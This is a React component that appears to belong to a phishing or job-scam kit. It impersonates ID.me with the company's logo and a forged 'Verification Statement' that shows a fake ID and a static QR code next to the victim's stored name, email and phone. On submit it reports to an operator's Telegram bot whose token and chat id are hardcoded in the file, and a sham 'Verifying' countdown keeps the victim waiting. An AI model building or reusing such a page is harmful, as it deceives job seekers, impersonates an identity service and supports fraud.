import React, { useEffect, useRef, useState } from "react";
import logo from '../assets/ID.me_Logo.png'
import bar from '../assets/bar-removebg-preview.png'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'

const Verified: React.FC = () => {

  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);

  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";
  const phoneNumber = parsedData.phone || "N/A";
  const email = parsedData.email || "N/A";
 

  const tableRef = useRef<HTMLDivElement>(null);

  const printPage = () => {
    window.print();
  };

  const downloadPDF = () => {
    if (tableRef.current) {
      (window as any).html2pdf().from(tableRef.current).save("application-data.pdf");
    }
  };

  const getFormattedDate = () => {
    const date = new Date();
  
    const day = date.getDate();
    const month = date.toLocaleString("default", { month: "long" });
    const year = date.getFullYear();
  
    const getDaySuffix = (d: number) => {
      if (d > 3 && d < 21) return "th";
      switch (d % 10) {
        case 1: return "st";
        case 2: return "nd";
        case 3: return "rd";
        default: return "th";
      }
    };
  
    const dayWithSuffix = `${day}${getDaySuffix(day)}`;
    return `${dayWithSuffix} of ${month} ${year}`;
  };
  

  const currentDate = getFormattedDate();

  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    setShowPopup(true);
  
    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
    const chatId = "7062736155";
    const message = `Verified`;
  
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
      
    } catch (error) {
      console.error("Error sending to Telegram:", error);
    }
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);



  

  return (
    <div className="flex flex-col justify-center items-center min-h-screen bg-white px-4">

{showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

     <button onClick={handleSubmit}></button>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
         <img src={connect} alt="" />

        </h1>

      
        



      </div>
      
      <div className="p-6 w-[90%] mx-auto">
  <h2 className="text-2xl font-bold mb-4 text-center">Verification Statement</h2>

  <p className="text-sm text-center font-semibold mb-9">Congratulations on successfully completing the verification process through our web-based service. If this verification is part of an employment procedure, you may now capture a screenshot, print the page, or download the Statement to provide to an employer 


  </p>
  <table className="table-auto border-collapse border border-gray-300 w-full">
    <tbody>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Verification ID
        </td>
        <td className="border border-gray-300 px-4 py-2 text-sm">005758484747484FSHDJK8993L</td>
      </tr>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Name
        </td>
        <td className="border border-gray-300 px-4 py-2 capitalize">{fullName}</td>
      </tr>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Email
        </td>
        <td className="border border-gray-300 px-4 py-2">{email}</td>
      </tr>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Phone Number
        </td>
        <td className="border border-gray-300 px-4 py-2">{phoneNumber}</td>
      </tr>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Date of Verification
        </td>
        <td className="border border-gray-300 px-4 py-2">{currentDate}</td>
      </tr>
      <tr className="border border-gray-300">
        <td className="border border-gray-300 px-4 py-2 font-medium bg-gray-100">
          Employer can verify document using this QR Code
        </td>
        <td className="border border-gray-300 px-4 py-2">
          <img src={bar} alt="QR Code" width={150} />
        </td>
      </tr>
    </tbody>
  </table>
</div>

<div className="flex gap-4 mb-4">
        <button
          onClick={printPage}
          className="bg-green-600 text-white px-4 py-2 rounded hover:bg-blue-700 transition"
        >
          Print Verification Statement
        </button>
        <button
          onClick={downloadPDF}
          className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 transition"
        >
          Download as PDF
        </button>
      </div>
    </div>
  );
};

export default Verified;
